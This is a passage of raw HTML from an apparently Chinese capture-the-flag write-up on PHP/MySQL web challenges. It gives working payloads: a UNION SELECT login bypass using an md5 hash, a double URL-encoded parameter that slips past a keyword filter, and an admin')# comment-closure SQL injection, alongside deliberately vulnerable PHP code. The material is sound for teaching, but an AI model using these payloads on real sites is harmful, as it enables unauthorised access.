class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">2</span>        <span class=\"token operator\">|</span> <span class=\"token number\">3</span>        <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token number\">1</span> row in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\nmysql<span class=\"token operator\">></span> select <span class=\"token operator\">*</span> from users <span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">id</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">username</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">password</span>   <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">Dumb</span>     <span class=\"token operator\">|</span> <span class=\"token class-name\">Dumb</span>       <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">2</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">Angelina</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">I</span><span class=\"token operator\">-</span>kill<span class=\"token operator\">-</span><span class=\"token class-name\">you</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">3</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">Dummy</span>    <span class=\"token operator\">|</span> <span class=\"token class-name\">p</span>@<span class=\"token class-name\">ssword</span>   <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">4</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">secure</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">crappy</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">5</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">stupid</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">stupidity</span>  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">6</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">superman</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">genious</span>    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">7</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">batman</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">mob</span><span class=\"token operator\">!</span><span class=\"token class-name\">le</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">8</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin</span>    <span class=\"token operator\">|</span> <span class=\"token class-name\">admin</span>      <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">9</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin1</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin1</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">10</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin2</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin2</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">11</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin3</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin3</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">12</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">dhakkan</span>  <span class=\"token operator\">|</span> <span class=\"token class-name\">dumbo</span>      <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">14</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin4</span>   <span class=\"token operator\">|</span> <span class=\"token class-name\">admin4</span>     <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token number\">13</span> rows in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>从两个查询语句中可以看出，这个union select查询的语句明显是不存在在数据表中的，它取决于我们union select后面输入的东西的</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">mysql<span class=\"token operator\">></span> select <span class=\"token operator\">*</span> from users where username<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span> union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token function\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">id</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">username</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">password</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">2</span>        <span class=\"token operator\">|</span> <span class=\"token class-name\">security</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token number\">1</span> row in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>那么如果我们用union select的话，这是不是就意味着password可控呢</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">mysql<span class=\"token operator\">></span> select <span class=\"token operator\">*</span> from users where username<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span> union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">123456</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">id</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">username</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">password</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">2</span>        <span class=\"token operator\">|</span> <span class=\"token number\">123456</span>   <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token number\">1</span> row in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时查询结果，取出password，那肯定就是123456了，由于密码提交的时候有<code>$pass = md5($_POST[pass]);</code>，所以我们提交123456，到检验时中就变成了<code>e10adc3949ba59abbe56e057f20f883e</code>（md5加密后的123456），那我们这个时候不就无法做到对应了吗，不过我们是不是可以把md5加密后的密码放到SQL语句中呢，这样比对的时候不就一致了吗，因此构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">user<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">' union select 1,2,'</span>e10adc3949ba59abbe56e057f20f883e' <span class=\"token comment\">#</span>\n<span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span><span class=\"token number\">123456</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h2 id=\"urldecode二次编码绕过\"><a href=\"#urldecode二次编码绕过\" class=\"headerlink\" title=\"urldecode二次编码绕过\"></a>urldecode二次编码绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">eregi</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hackerDJ\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;p>not allowed!&lt;/p>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"hackerDJ\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Access granted!&lt;/p>\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>flag: *****************&#125; &lt;/p>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>简单读一下代码就可以知道这道题条件是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、id参数不能为hackerDJ\n<span class=\"token number\">2</span>、id参数经过url解码后为hackerDJ<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>这个时候思路就比较明确了，那就是给id参数赋值为hackerDJ然后进行url编码，但服务端接受参数时会自动进行一次编码，我们如果只编码一次的话还是绕不过去，因此这里需要进行二次编码，一般的工具url编码无法实现，这里可以借助burpsuite来实现，burpsuite可以实现全编码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141529776.png\" alt=\"在这里插入图片描述\"><br>构造最终payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token operator\">%</span><span class=\"token number\">2568</span><span class=\"token operator\">%</span><span class=\"token number\">2561</span><span class=\"token operator\">%</span><span class=\"token number\">2563</span><span class=\"token operator\">%</span><span class=\"token number\">256</span>b<span class=\"token operator\">%</span><span class=\"token number\">2565</span><span class=\"token operator\">%</span><span class=\"token number\">2572</span><span class=\"token operator\">%</span><span class=\"token number\">2544</span><span class=\"token operator\">%</span><span class=\"token number\">254</span>a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528341.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"sql闭合绕过\"><a href=\"#sql闭合绕过\" class=\"headerlink\" title=\"sql闭合绕过\"></a>sql闭合绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>pass<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_connect</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"*******\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"****\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"****\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">mysql_select_db</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"****\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Could not select database\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token property\">connect_error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Connection failed: \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">mysql_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>user<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>pass<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select user from php where (user='<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>') and (pw='<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>')\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Error: %s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">mysql_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">MYSQL_ASSOC</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Logged in! Key: *********** &lt;/p>\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;p>You are not admin!&lt;/p>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>两个条件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、语句不能报错，需要有查询结果\n<span class=\"token number\">2</span>、传入的user参数需要为admin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>那么这就相当于给出了用户名为admin，让你提交密码，只有密码正确的时候才可以使得结果不报错，从而回显flag，但我们不知道密码，此时想到另一种方式，用注释符<code>#</code>闭合语句是不是也可以使得结果不报错呢，我们本地测试一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">mysql<span class=\"token operator\">></span> select <span class=\"token operator\">*</span> from users <span class=\"token function\">where</span> <span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span>password<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">id</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">username</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">password</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">8</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin</span>    <span class=\"token operator\">|</span> <span class=\"token class-name\">admin</span>    <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token number\">1</span> row in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\nmysql<span class=\"token operator\">></span> select <span class=\"token operator\">*</span> from users <span class=\"token function\">where</span> <span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#;</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token class-name\">id</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">username</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">password</span> <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span>  <span class=\"token number\">8</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">admin</span>    <span class=\"token operator\">|</span> <span class=\"token class-name\">admin</span>    <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n<span class=\"token number\">1</span> row in <span class=\"token function\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以发现是可以正常查询的，有查询结果，但此时如果我们用#闭合的话，此时语句就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select user from php where (user='admin#') and (pw='<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>')\"</span><span class=\"token punctuation\">;</span>\n等同于\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> \"select user from php <span class=\"token function\">where</span> <span class=\"token punctuation\">(</span>user<span class=\"token operator\">=</span>'admin<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>不难看出语句是有问题的，需要进行闭合，因此我们需要添加上<code>&#39;)</code>，构造最终payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">username<span class=\"token operator\">=</span>admin'<span class=\"token punctuation\">)</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时语句就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> \"select user from php <span class=\"token function\">where</span> <span class=\"token punctuation\">(</span>user<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"X-Forwarded-For绕过指定IP地址\"><a href=\"#X-Forwarded-For绕过指定IP地址\" class=\"headerlink\" 